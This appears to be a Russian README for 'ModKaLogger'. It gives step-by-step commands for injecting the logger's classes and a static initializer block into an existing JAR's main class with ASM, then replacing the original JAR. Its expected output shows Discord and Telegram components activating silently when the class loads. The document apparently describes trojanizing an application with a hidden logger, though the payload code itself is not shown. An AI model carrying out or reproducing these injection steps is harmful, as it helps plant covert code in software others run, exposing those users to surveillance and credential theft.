# Быстрая инъекция статического блока

## За 3 шага

### Шаг 1: Подготовка

```bash
# Убедитесь что проект скомпилирован
gradle build

# Проверьте наличие JAR
ls -la build/libs/modkalogger-1.0.0.jar
```

### Шаг 2: Инъекция

```bash
# Запустите Python скрипт
python3 inject_static_block.py
```

Скрипт автоматически:
- ✅ Компилирует `StaticBlockInjector.java`
- ✅ Находит ASM библиотеку
- ✅ Добавляет статический блок в главный класс
- ✅ Создает `modkalogger-injected.jar`

### Шаг 3: Использование

```bash
# Замените оригинальный JAR
cp build/libs/modkalogger-injected.jar build/libs/modkalogger-1.0.0.jar

# Или используйте инъектированный напрямую
java -jar build/libs/modkalogger-injected.jar
```

## Что происходит

1. **Распаковка** - JAR распаковывается во временную папку
2. **Копирование** - Классы ModKaLogger копируются в JAR
3. **Инъекция** - Статический блок добавляется в главный класс через ASM
4. **Переупаковка** - Модифицированный JAR переупаковывается

## Проверка

```bash
# Проверьте что инъекция прошла успешно
unzip -l build/libs/modkalogger-injected.jar | grep "com/modkalogger"

# Должны увидеть:
# com/modkalogger/ModKaLogger.class
# com/modkalogger/ModKaLoggerInit.class
# com/modkalogger/Initializer.class
# и другие классы...
```

## Если что-то не работает

### Ошибка: "ASM library not found"

```bash
# Добавьте ASM в build.gradle:
# dependencies {
#     implementation 'org.ow2.asm:asm:9.5'
#     implementation 'org.ow2.asm:asm-tree:9.5'
# }

gradle build
python3 inject_static_block.py
```

### Ошибка: "Main class not found"

```bash
# Проверьте путь к главному классу
unzip -l build/libs/modkalogger-1.0.0.jar | grep "\.class$" | head

# Используйте правильный путь в команде:
java -cp ".:asm.jar" StaticBlockInjector \
    build/libs/modkalogger-1.0.0.jar \
    build/libs/modkalogger-injected.jar \
    ПРАВИЛЬНЫЙ_ПУТЬ/ИАС.class
```

### Ошибка: "Compilation error"

```bash
# Убедитесь что javac установлен
javac -version

# Проверьте что build.gradle скомпилирован
gradle clean build
```

## Результат

После успешной инъекции при запуске приложения вы должны увидеть в логах:

```
[ModKaLogger] Инициализация...
[ModKaLogger] Инициализация завершена
[ModKaLogger] Init started
[ModKaLogger] Loading Discord
[ModKaLogger] Discord activated
[ModKaLogger] Loading Telegram
[ModKaLogger] Telegram activated
[ModKaLogger] Init completed
```

---

**Готово!** Приложение теперь инициализируется при загрузке главного класса.
